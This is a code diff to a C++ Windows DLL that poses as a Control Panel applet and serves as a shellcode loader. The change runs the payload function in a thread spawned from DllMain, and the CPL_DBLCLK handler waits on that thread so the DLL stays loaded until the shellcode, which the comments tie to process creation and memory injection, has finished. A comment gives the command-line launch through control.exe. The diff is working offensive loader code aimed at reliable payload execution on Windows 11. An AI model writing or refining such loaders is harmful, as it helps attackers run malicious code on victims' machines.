@@ -207,35 +207,33 @@ extern "C" __declspec(dllexport) HRESULT DllUnregisterServer(void)
 #define CPL_STOP      6
 #define CPL_EXIT      7
 
-static BOOL entry_called = FALSE;
+// Payload thread handle kept alive so CPL_DBLCLK can wait on it.
+static HANDLE g_payload_thread = NULL;
 
-// DllMain fires on process attach and delegates immediately to CplApplet so that
-// both load paths (control.exe command-line and double-click in Control Panel UI)
-// share a single execution path.  The call is synchronous - no background thread
-// is spawned here - because control.exe calls CPL_STOP / CPL_EXIT in rapid
-// succession after the window returns, which would unload the DLL before an async
-// thread is scheduled.
+static DWORD WINAPI EntryThread(LPVOID)
+{
+	entry();
+	return 0;
+}
+
+// DllMain spawns the payload thread and retains the handle — it does NOT
+// close it.  Spawning here is safe: the thread is only *scheduled* inside
+// DllMain; it begins executing after DllMain returns and the loader lock is
+// released, so entry() can freely call CreateProcess, VirtualAllocEx, etc.
+// CplApplet(CPL_DBLCLK) then waits on the handle, which keeps the DLL
+// mapped until shellcode finishes and prevents the premature unload that
+// breaks async threads on Windows 11.
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
 {
-	switch (ul_reason_for_call)
-	{
-	case DLL_PROCESS_ATTACH:
+	if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
 		DisableThreadLibraryCalls(hModule);
-		CplApplet(NULL, CPL_DBLCLK, 0, 0);
-		break;
-	case DLL_THREAD_ATTACH:
-	case DLL_THREAD_DETACH:
-	case DLL_PROCESS_DETACH:
-		break;
+		g_payload_thread = CreateThread(NULL, 0, EntryThread, NULL, 0, NULL);
 	}
 	return TRUE;
 }
 
 // CplApplet is the mandatory export that identifies this DLL as a Control Panel
-// applet. Windows calls it via control.exe or the Control Panel host process.
-// All execution paths converge on CPL_DBLCLK, which runs entry() synchronously.
-// entry_called prevents double execution when DllMain triggers the first call and
-// the host subsequently delivers the real CPL_DBLCLK message.
+// applet.  For command-line invocation use:  control.exe payload.cpl,,0
 extern "C" __declspec(dllexport) LONG CplApplet(
 	HWND  hwndCpl,
 	UINT  uMsg,
@@ -245,23 +243,22 @@ extern "C" __declspec(dllexport) LONG CplApplet(
 	switch (uMsg)
 	{
 	case CPL_INIT:
-		// Return non-zero to indicate successful initialisation.
 		return 1;
 
 	case CPL_GETCOUNT:
-		// One applet hosted by this DLL.
 		return 1;
 
 	case CPL_INQUIRE:
-		// We do not populate the CPLINFO struct - no visible applet icon needed.
 		return 0;
 
 	case CPL_DBLCLK:
-		// Primary execution trigger - runs synchronously so the DLL stays loaded
-		// for the full duration of shellcode setup.
-		if (!entry_called) {
-			entry_called = TRUE;
-			entry();
+		// Block here until the payload thread (started in DllMain) finishes.
+		// This prevents Control_RunDLL from calling CPL_STOP / FreeLibrary
+		// before shellcode has completed execution.
+		if (g_payload_thread) {
+			WaitForSingleObject(g_payload_thread, INFINITE);
+			CloseHandle(g_payload_thread);
+			g_payload_thread = NULL;
 		}
 		return 0;
 
